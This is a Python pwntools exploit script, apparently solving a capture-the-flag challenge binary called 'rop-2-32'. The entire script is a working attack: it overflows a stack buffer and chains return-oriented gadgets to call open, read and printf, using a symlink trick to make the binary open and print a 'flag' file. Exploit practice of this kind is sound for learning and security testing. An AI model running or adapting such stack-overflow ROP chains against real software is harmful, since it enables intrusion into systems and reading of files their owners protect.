#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-2-32')

buf = "A" * 0x8c

"""
0x08048380  read@plt
0x08048390  printf@plt
0x080483a0  exit@plt
0x080483b0  open@plt
"""
openAddr = p32(0x080483b0)
readAddr = p32(0x08048380)
printAddr = p32(0x08048390)

"""
0x0804868b : pop ebp ; ret
0x08048688 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048369 : pop ebx ; ret
0x08048625 : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x0804868a : pop edi ; pop ebp ; ret
0x08048689 : pop esi ; pop edi ; pop ebp ; ret
"""

pop_ebp = p32(0x0804868b)
pop_esi_edi_ebp = p32(0x08048689)
flag = p32(0x8048028)
memory = p32(0x804a800)

if os.path.exists("4"):
    os.unlink("4")
os.symlink("flag", "4")

buf += openAddr
buf += pop_esi_edi_ebp
buf += flag
buf += p32(0)
buf += p32(0)
buf += readAddr
buf += pop_esi_edi_ebp
buf += p32(3)
buf += memory
buf += p32(0x100)
buf += printAddr
buf += "AAAA"
buf += memory

with open("exploit.txt", "wb") as f:
        f.write(buf)

p.sendline(buf)
p.interactive()
